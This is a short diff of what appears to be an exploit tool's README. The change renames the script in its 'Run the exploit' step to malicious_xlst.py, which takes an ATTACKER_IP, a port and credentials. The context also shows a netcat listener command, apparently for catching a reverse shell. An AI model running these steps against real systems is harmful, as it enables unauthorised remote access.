@@ -55,5 +55,5 @@ nc -lvnp <PORT>
 
 ### **2️⃣ Run the exploit**
 ```
-python3 exploit.py --ip <ATTACKER_IP>  --puerto <PORT> --username <USERNAME> --password <PASSWORD>
+python3 malicious_xlst.py --ip <ATTACKER_IP>  --puerto <PORT> --username <USERNAME> --password <PASSWORD>
 ```
